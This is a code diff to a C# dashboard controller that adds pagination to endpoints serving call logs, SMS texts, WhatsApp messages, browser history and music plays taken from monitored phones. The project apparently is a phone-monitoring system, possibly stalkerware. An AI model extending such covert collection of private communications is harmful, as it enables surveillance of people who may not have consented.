@@ -159,52 +159,64 @@ public class DashboardController(AppDbContext db) : ControllerBase
     // ── Call Logs ──────────────────────────────────────────────────────────────
 
     [HttpGet("devices/{deviceId:int}/calls")]
-    public async Task<IActionResult> GetCallLogs(int deviceId, [FromQuery] int limit = 100)
+    public async Task<IActionResult> GetCallLogs(int deviceId, [FromQuery] int page = 1, [FromQuery] int pageSize = 50)
     {
         if (!await CanAccessDeviceAsync(deviceId)) return Forbid();
 
-        var data = await db.CallLogs
+        var query = db.CallLogs
             .Where(c => c.DeviceId == deviceId)
-            .OrderByDescending(c => c.Date)
-            .Take(limit)
+            .OrderByDescending(c => c.Date);
+
+        var total = await query.CountAsync();
+        var items = await query
+            .Skip((page - 1) * pageSize)
+            .Take(pageSize)
             .Select(c => new CallLogDto(c.Number, c.Name, c.Type, c.Date, c.Duration))
             .ToListAsync();
 
-        return Ok(data);
+        return Ok(new { items, total });
     }
 
     // ── SMS ────────────────────────────────────────────────────────────────────
 
     [HttpGet("devices/{deviceId:int}/sms")]
-    public async Task<IActionResult> GetSmsLogs(int deviceId, [FromQuery] int limit = 100)
+    public async Task<IActionResult> GetSmsLogs(int deviceId, [FromQuery] int page = 1, [FromQuery] int pageSize = 50)
     {
         if (!await CanAccessDeviceAsync(deviceId)) return Forbid();
 
-        var data = await db.SmsLogs
+        var query = db.SmsLogs
             .Where(s => s.DeviceId == deviceId)
-            .OrderByDescending(s => s.Date)
-            .Take(limit)
+            .OrderByDescending(s => s.Date);
+
+        var total = await query.CountAsync();
+        var items = await query
+            .Skip((page - 1) * pageSize)
+            .Take(pageSize)
             .Select(s => new SmsDto(s.Address, s.Body, s.Date, s.Type))
             .ToListAsync();
 
-        return Ok(data);
+        return Ok(new { items, total });
     }
 
     // ── WhatsApp notifications ─────────────────────────────────────────────────
 
     [HttpGet("devices/{deviceId:int}/whatsapp")]
-    public async Task<IActionResult> GetWhatsApp(int deviceId, [FromQuery] int limit = 100)
+    public async Task<IActionResult> GetWhatsApp(int deviceId, [FromQuery] int page = 1, [FromQuery] int pageSize = 50)
     {
         if (!await CanAccessDeviceAsync(deviceId)) return Forbid();
 
-        var data = await db.WhatsAppMsgs
+        var query = db.WhatsAppMsgs
             .Where(w => w.DeviceId == deviceId)
-            .OrderByDescending(w => w.Timestamp)
-            .Take(limit)
+            .OrderByDescending(w => w.Timestamp);
+
+        var total = await query.CountAsync();
+        var items = await query
+            .Skip((page - 1) * pageSize)
+            .Take(pageSize)
             .Select(w => new WhatsAppDto(w.AppPackage, w.AppName, w.AppIcon == "" ? null : w.AppIcon, w.Sender, w.Message, w.Timestamp))
             .ToListAsync();
 
-        return Ok(data);
+        return Ok(new { items, total });
     }
 
     // ── WhatsApp chats (accessibility) ─────────────────────────────────────────
@@ -249,34 +261,42 @@ public class DashboardController(AppDbContext db) : ControllerBase
     // ── Browser History ──────────────────────────────────────────────────────
 
     [HttpGet("devices/{deviceId:int}/browser")]
-    public async Task<IActionResult> GetBrowserHistory(int deviceId, [FromQuery] int limit = 200)
+    public async Task<IActionResult> GetBrowserHistory(int deviceId, [FromQuery] int page = 1, [FromQuery] int pageSize = 50)
     {
         if (!await CanAccessDeviceAsync(deviceId)) return Forbid();
 
-        var data = await db.BrowserHistory
+        var query = db.BrowserHistory
             .Where(b => b.DeviceId == deviceId)
-            .OrderByDescending(b => b.Timestamp)
-            .Take(limit)
+            .OrderByDescending(b => b.Timestamp);
+
+        var total = await query.CountAsync();
+        var items = await query
+            .Skip((page - 1) * pageSize)
+            .Take(pageSize)
             .Select(b => new BrowserHistoryDto(b.Url, b.Title, b.Browser, b.IconBase64, b.Timestamp))
             .ToListAsync();
 
-        return Ok(data);
+        return Ok(new { items, total });
     }
 
     // ── Music ──────────────────────────────────────────────────────────────────
 
     [HttpGet("devices/{deviceId:int}/music")]
-    public async Task<IActionResult> GetMusicHistory(int deviceId, [FromQuery] int limit = 200)
+    public async Task<IActionResult> GetMusicHistory(int deviceId, [FromQuery] int page = 1, [FromQuery] int pageSize = 50)
     {
         if (!await CanAccessDeviceAsync(deviceId)) return Forbid();
 
-        var data = await db.MusicPlays
+        var query = db.MusicPlays
             .Where(m => m.DeviceId == deviceId)
-            .OrderByDescending(m => m.Timestamp)
-            .Take(limit)
+            .OrderByDescending(m => m.Timestamp);
+
+        var total = await query.CountAsync();
+        var items = await query
+            .Skip((page - 1) * pageSize)
+            .Take(pageSize)
             .Select(m => new MusicPlayDto(m.AppPackage, m.TrackTitle, m.ArtistName, m.AlbumName, m.DurationMs, m.AlbumArt, m.Timestamp))
             .ToListAsync();
 
-        return Ok(data);
+        return Ok(new { items, total });
     }
 }
